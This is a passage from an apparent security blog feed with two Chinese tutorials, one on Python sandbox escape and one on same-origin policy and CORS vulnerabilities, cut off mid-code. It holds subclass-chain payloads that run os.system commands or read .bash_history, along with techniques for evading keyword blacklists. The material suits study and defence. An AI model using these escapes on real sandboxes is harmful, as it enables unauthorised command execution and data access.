危险模块</span></span><br><span class="line">methods = [<span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;commands&#x27;</span>, <span class="string">&#x27;timeit&#x27;</span>, <span class="string">&#x27;bdb&#x27;</span>, <span class="string">&#x27;cgi&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;pickle&#x27;</span>, <span class="string">&#x27;pty&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;import_module&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;spawn&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;linecache&#x27;</span>, <span class="string">&#x27;types&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 基本类型</span></span><br><span class="line">types = [<span class="string">&#x27;&#x27;</span>, [], (), &#123;&#125;]</span><br><span class="line"></span><br><span class="line"><span class="comment"># object的派生类</span></span><br><span class="line">subclasses = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 危险标准库模块</span></span><br><span class="line">risk_modules = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历派生类并获取模块</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(object.__subclasses__())):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        subclasses[i] = object.__subclasses__()[i].__init__.__globals__.keys()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># print(e)</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;------------------------------ 思路二 ------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入了危险模块的派生类</span></span><br><span class="line"><span class="keyword">for</span> i, submodules <span class="keyword">in</span> subclasses.items():</span><br><span class="line">    <span class="keyword">for</span> submodule <span class="keyword">in</span> submodules:</span><br><span class="line">        <span class="keyword">for</span> method <span class="keyword">in</span> methods:</span><br><span class="line">            <span class="keyword">if</span> method == submodule:</span><br><span class="line">                <span class="comment"># print(f&quot;object.__subclasses__()[&#123;i&#125;].__init__.__globals__[&#x27;&#123;method&#125;&#x27;]&quot;)</span></span><br><span class="line">                print(<span class="string">&quot;object.__subclasses__()[&#123;i&#125;].__init__.__globals__[&#x27;&#123;method&#125;&#x27;]&quot;</span>.format(i=i, method=method))</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;------------------------------ 缓冲区 ------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断Python版本</span></span><br><span class="line"><span class="keyword">if</span> (sys.version_info[<span class="number">0</span>]) == <span class="number">3</span>:</span><br><span class="line">    modules = modules3</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    modules = modules2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入了危险模块的标准库</span></span><br><span class="line"><span class="keyword">for</span> module <span class="keyword">in</span> modules:</span><br><span class="line">    risk_modules[module] = []</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        m = __import__(module)  <span class="comment"># 导入模块</span></span><br><span class="line">        attrs = dir(m)          <span class="comment"># 获取属性与方法</span></span><br><span class="line">        <span class="keyword">for</span> method <span class="keyword">in</span> methods:</span><br><span class="line">            <span class="keyword">if</span> method <span class="keyword">in</span> attrs: <span class="comment"># 若存在危险模块</span></span><br><span class="line">                risk_modules[module].append(method)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># print(e)</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;------------------------------ 思路三 ------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入了危险标准库的派生类</span></span><br><span class="line"><span class="keyword">for</span> i, submodules <span class="keyword">in</span> subclasses.items():</span><br><span class="line">    <span class="keyword">for</span> submodule <span class="keyword">in</span> submodules:</span><br><span class="line">        <span class="keyword">for</span> risk_module <span class="keyword">in</span> risk_modules.keys():</span><br><span class="line">            <span class="keyword">if</span> risk_module == submodule:</span><br><span class="line">                <span class="keyword">for</span> method <span class="keyword">in</span> risk_modules[risk_module]:</span><br><span class="line">                    <span class="comment"># print(f&quot;object.__subclasses__()[&#123;i&#125;].__init__.__globals__[&#x27;&#123;risk_module&#125;&#x27;].__dict__[&#x27;&#123;method&#125;&#x27;]&quot;)</span></span><br><span class="line">                    print(<span class="string">&quot;object.__subclasses__()[&#123;i&#125;].__init__.__globals__[&#x27;&#123;risk_module&#125;&#x27;].__dict__[&#x27;&#123;method&#125;&#x27;]&quot;</span>.format(i=i, risk_module=risk_module, method=method))</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;------------------------------ 思路四 ------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 基本类型的特殊方法</span></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> types:</span><br><span class="line">    <span class="keyword">for</span> method <span class="keyword">in</span> dir(t):</span><br><span class="line">        <span class="comment"># 待比较类型</span></span><br><span class="line">        c = str(t.__getattribute__(method).__class__)</span><br><span class="line">        <span class="comment"># Python2特殊类型</span></span><br><span class="line">        c2 = <span class="string">&quot;&lt;type &#x27;builtin_function_or_method&#x27;&gt;&quot;</span></span><br><span class="line">        <span class="comment"># Python3特殊类型</span></span><br><span class="line">        c3 = <span class="string">&quot;&lt;class &#x27;builtin_function_or_method&#x27;&gt;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> c == c2 <span class="keyword">or</span> c == c3:</span><br><span class="line">            <span class="comment"># 转义双引号</span></span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">                t = <span class="string">&quot;&#x27;&#x27;&quot;</span></span><br><span class="line">            print(<span class="string">&quot;&#123;t&#125;.&#123;method&#125;.__class__.__call__&quot;</span>.format(t=t, method=method))</span><br></pre></td></tr></table></figure><h4 id="思路一实例"><a href="#思路一实例" class="headerlink" title="思路一实例"></a>思路一实例</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python3</span></span><br><span class="line">object.__subclasses__()[<span class="number">37</span>].__call__(eval, <span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python2 </span></span><br><span class="line">object.__subclasses__()[<span class="number">29</span>].__call__(eval, <span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</span><br><span class="line">object.__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;.bash_history&#x27;</span>).read()</span><br></pre></td></tr></table></figure><h4 id="思路二实例"><a href="#思路二实例" class="headerlink" title="思路二实例"></a>思路二实例</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python3</span></span><br><span class="line">object.__subclasses__()[<span class="number">134</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">object.__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python3</span></span><br><span class="line">object.__subclasses__()[<span class="number">134</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">object.__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="思路三实例"><a href="#思路三实例" class="headerlink" title="思路三实例"></a>思路三实例</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python3</span></span><br><span class="line">object.__subclasses__()[<span class="number">170</span>].__init__.__globals__[<span class="string">&#x27;_collections_abc&#x27;</span>].__dict__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">object.__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;linecache&#x27;</span>].__dict__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="思路三特例"><a href="#思路三特例" class="headerlink" title="思路三特例"></a>思路三特例</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python3</span></span><br><span class="line">object.__subclasses__()[<span class="number">134</span>]()._module.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">object.__subclasses__()[<span class="number">59</span>]()._module.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="思路四实例"><a href="#思路四实例" class="headerlink" title="思路四实例"></a>思路四实例</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].append.__class__.__call__(eval, <span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h2><p>有些时候并不是删掉了某个危险模块，而是设置了一个输入关键字黑名单。如果是利用链中的字符串类型可以通过拼接、编码、倒序等多种方式绕过，如果是方法或属性可以通过同义替换绕过。</p><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 拼接</span></span><br><span class="line"><span class="string">&quot;__im&quot;</span>+<span class="string">&quot;port__(&#x27;o&quot;</span>+<span class="string">&quot;s&#x27;).sy&quot;</span>+<span class="string">&quot;stem(&#x27;who&quot;</span>+<span class="string">&quot;ami&#x27;)&quot;</span></span><br><span class="line"><span class="comment"># 编码</span></span><br><span class="line">eval(chr(<span class="number">95</span>)+chr(<span class="number">95</span>)+chr(<span class="number">105</span>)+chr(<span class="number">109</span>)+chr(<span class="number">112</span>)+chr(<span class="number">111</span>)+chr(<span class="number">114</span>)+chr(<span class="number">116</span>)+chr(<span class="number">95</span>)+chr(<span class="number">95</span>)+chr(<span class="number">40</span>)+chr(<span class="number">39</span>)+chr(<span class="number">111</span>)+chr(<span class="number">115</span>)+chr(<span class="number">39</span>)+chr(<span class="number">41</span>)+chr(<span class="number">46</span>)+chr(<span class="number">115</span>)+chr(<span class="number">121</span>)+chr(<span class="number">115</span>)+chr(<span class="number">116</span>)+chr(<span class="number">101</span>)+chr(<span class="number">109</span>)+chr(<span class="number">40</span>)+chr(<span class="number">39</span>)+chr(<span class="number">119</span>)+chr(<span class="number">104</span>)+chr(<span class="number">111</span>)+chr(<span class="number">97</span>)+chr(<span class="number">109</span>)+chr(<span class="number">105</span>)+chr(<span class="number">39</span>)+chr(<span class="number">41</span>))</span><br><span class="line"><span class="comment"># 倒序</span></span><br><span class="line"><span class="string">&quot;)&#x27;imaohw&#x27;(metsys.)&#x27;so&#x27;(__tropmi__&quot;</span>[::<span class="number">-1</span>]</span><br></pre></td></tr></table></figure><h3 id="中括号"><a href="#中括号" class="headerlink" title="中括号"></a>中括号</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># [].__class__.__bases__[0].__subclasses__()[37]</span></span><br><span class="line">().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().pop(<span class="number">37</span>)</span><br></pre></td></tr></table></figure><h3 id="点号"><a href="#点号" class="headerlink" title="点号"></a>点号</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getattr(getattr(getattr(getattr(getattr((),<span class="string">&#x27;__class__&#x27;</span>),<span class="string">&#x27;__bases__&#x27;</span>),<span class="string">&#x27;__getitem__&#x27;</span>)(<span class="number">0</span>),<span class="string">&#x27;__subclasses__&#x27;</span>)(),<span class="string">&#x27;pop&#x27;</span>)(<span class="number">37</span>)</span><br></pre></td></tr></table></figure><h3 id="下划线"><a href="#下划线" class="headerlink" title="下划线"></a>下划线</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getattr(getattr(getattr(getattr(getattr((),dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>+<span class="string">&#x27;class&#x27;</span>+dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>),dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>+<span class="string">&#x27;bases&#x27;</span>+dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>),dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>+<span class="string">&#x27;getitem&#x27;</span>+dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>)(<span class="number">0</span>),dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>+<span class="string">&#x27;subclasses&#x27;</span>+dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>)(),<span class="string">&#x27;pop&#x27;</span>)(<span class="number">37</span>)</span><br></pre></td></tr></table></figure><h3 id="引号"><a href="#引号" class="headerlink" title="引号"></a>引号</h3><p>只过滤引号的话可以利用一些通过序号取值的方法，但是如果点号不能用就得用getattr，而getattr又需要用到引号。。。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/">Python 沙箱逃逸的经验总结</a></p><p><a href="https://www.smi1e.top/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">Python 沙箱逃逸</a></p><p><a href="https://hatboy.github.io/2018/04/19/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%80%BB%E7%BB%93/">Python沙箱逃逸总结</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Python沙箱逃逸指的是：突破原本受限的Python交互环境，实现执行命令、读写文件等操作。&lt;/p&gt;
&lt;h2 id=&quot;导入模块&quot;&gt;&lt;a href=&quot;#导入模块&quot; class=&quot;headerlink&quot; title=&quot;导入模块&quot;&gt;&lt;/a&gt;导入模块&lt;/h2&gt;&lt;p&gt;Python导</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="python" scheme="https://hosch3n.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>同源策略与跨域漏洞</title>
    <link href="https://hosch3n.github.io/2020/08/26/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E4%B8%8E%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E/"/>
    <id>https://hosch3n.github.io/2020/08/26/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E4%B8%8E%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-08-26T08:48:53.000Z</published>
    <updated>2020-12-06T08:50:54.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="何为同源"><a href="#何为同源" class="headerlink" title="何为同源"></a>何为同源</h2><p>如果两个URL的协议、域名、端口一致则满足同源，<code>http</code>与<code>https</code>、<code>a.x.com</code>与<code>b.x.com</code>、<code>:80</code>与<code>:81</code>均不符合同源条件。通过<code>windows.open()</code>等方式打开的<code>about:blank</code>空白页将继承上级的源</p><ul><li>IE浏览器中，两个相互信任的白名单域名之间、以及不同端口均不受同源策略限制</li></ul><h2 id="如何跨域"><a href="#如何跨域" class="headerlink" title="如何跨域"></a>如何跨域</h2><h3 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h3><p>在处理前后端分离、跨站请求等业务时可能会涉及跨域访问，浏览器出于安全考虑将拦截跨域请求的响应结果（但不会阻止发出跨域请求），除非存在相应的CORS响应头</p><p>满足CORS条件后，浏览器继续将跨域请求细分为 简单型请求 与 预检型请求。只有满足特定HTTP头的<code>GET</code>、<code>POST</code>、<code>HEAD</code>请求为简单请求，否则为预检请求，具体条件见参考链接2</p><p>简单型请求会直接发起请求并响应结果，但预检型请求发起前浏览器会先发起<code>OPTIONS</code>请求用作校验。预检型请求的响应将包含<code>Access-Control-Max-Age</code>响应头用于说明有效时间（秒），在有效时间内不必再次发起预检请求</p><p>若<code>XMLHttpRequest</code>对象的<code>withCredentials</code>属性被设置为<code>true</code>，或是向<code>fetch()</code>方法的<code>init</code>对象传递了<code>credentials: &#39;include&#39;</code>，则其在发送请求时会附带Cookies。但如果响应头缺少<code>Access-Control-Allow-Credentials: true</code>，则浏览器不会展现响应内容</p><ul><li>带Cookies的请求，服务器的<code>Access-Control-Allow-Origin</code>不能为<code>*</code>，即浏览器不会展现如下响应头组合的页面：</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Origin</span>: *</span><br><span class="line"><span class="attribute">Access-Control-Allow-Credentials</span>: true</span><br></pre></td></tr></table></figure><h3 id="src属性"><a href="#src属性" class="headerlink" title="src属性"></a>src属性</h3><p>有<code>src</code>属性的标签都是可以发起跨域请求的，但仅限于对其原本内容的引用，而不可以对跨域加载的资源进行读写</p><h3 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h3><p>JSONPadding是一个精妙的民间花式跨域方法，通过回调函数配合JSON数据填充来实现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- a.x.com --&gt;</span><br><span class="line"><span class="comment">// 原生JS形式</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">&#x27;//b.x.com/?callback=fun&#x27;</span>&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// jQuery $.getJSON形式</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    $.getJSON(<span class="string">&#x27;//b.x.com/?callback=?&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;);</span><br><span class="line">&lt;/script&gt; </span><br><span class="line"></span><br><span class="line"><span class="comment">// jQuery $.ajax形式</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    $(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            type: <span class="string">&quot;get&quot;</span>, <span class="comment">// 请求方法JSONP默认GET，POST也会转GET</span></span><br><span class="line">            async: <span class="literal">false</span>, <span class="comment">// 异步请求JSONP默认false，true也会转false</span></span><br><span class="line">            url: <span class="string">&quot;//b.x.com/&quot;</span>,</span><br><span class="line">            <span class="comment">// data: &#123;&quot;code&quot; : &quot;CA1405&quot;&#125;, // 传入参数</span></span><br><span class="line">            dataType: <span class="string">&quot;jsonp&quot;</span>,</span><br><span class="line">            jsonp: <span class="string">&quot;callback&quot;</span>,</span><br><span class="line">            <span class="comment">// jsonpCallback:&quot;flightHandler&quot;, // 回调函数名jQuery默认随机，也可以写&quot;?&quot;</span></span><br><span class="line">            success: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">                <span class="comment">// ...</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="built_in">error</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="comment">// ...</span></span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// jQuery $.get形式</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">$.get(<span class="string">&#x27;//b.x.com/?callback=?&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;<span class="comment">/* ... */</span>&#125;, <span class="string">&#x27;jsonp&#x27;</span>);  </span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!-- b.x.com --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-type: application/json&#x27;</span>);</span><br><span class="line">$callback = $_GET[<span class="string">&#x27;callback&#x27;</span>];</span><br><span class="line">$data = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> $callback.<span class="string">&#x27;(&#x27;</span>.json_encode($data).<span class="string">&#x27;)&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="子仗父势"><a href="#子仗父势" class="headerlink" title="子仗父势"></a>子仗父势</h3><p>如果显式地将<code>a.x.com</code>、<code>b.x.com</code>与<code>x.com</code>的<code>document.domain</code>属性同时设置为<code>x.com</code>，则可以同时满足同源条件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">    - 此赋值会重写端口为NULL </span></span><br><span class="line"><span class="comment">    - 不影响 XMLHttpRequest 与 fetch</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// x.com</span></span><br><span class="line"><span class="built_in">document</span>.domain = <span class="string">&#x27;x.com&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// a.x.com</span></span><br><span class="line"><span class="built_in">document</span>.domain = <span class="string">&#x27;x.com&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// b.x.com</span></span><br><span class="line"><span class="built_in">document</span>.domain = <span class="string">&#x27;x.com&#x27;</span>;</span><br></pre></td></tr></table></figure><h3 id="边缘试探"><a href="#边缘试探" class="headerlink" title="边缘试探"></a>边缘试探</h3><p><code>window.name</code>属性伴随一个window的整个声明周期，在此期间iframe内载入的所有页面共享同一个<code>window.name</code>值</p><p><code>postMesage</code>配合监听事件、<code>location.hash</code>配合中间页均有一定跨域效果</p><h2 id="攻击思路一"><a href="#攻击思路一" class="headerlink" title="攻击思路一"></a>攻击思路一</h2><p>若为了方便直接将Origin请求头拼接进CORS响应头，会导致CORS跨域漏洞。假设<code>a.x.com/index.php</code>负责校验身份并设置Cookie，<code>a.x.com/cors.php</code>负责返回敏感数据，当受害者登录目标站点后，在Cookie失效前又访问了恶意站点<code>hack.com</code>，即可被攻击者窃取敏感数据</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- a.x.com/index.php --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line">$user = <span class="keyword">isset</span>($_POST[<span class="string">&#x27;user&#x27;</span>]) ? $_POST[<span class="string">&#x27;user&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$passwd = <span class="keyword">isset</span>($_POST[<span class="string">&#x27;passwd&#x27;</span>]) ? $_POST[<span class="string">&#x27;passwd&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> ($user===<span class="string">&#x27;admin&#x27;</span> &amp;&amp; $passwd===<span class="string">&#x27;passwd&#x27;</span>) &#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;user&#x27;</span>] = $user;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;logout&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">&#x27;logout&#x27;</span>]===<span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">unset</span>($_SESSION[<span class="string">&#x27;user&#x27;</span>]);</span><br><span 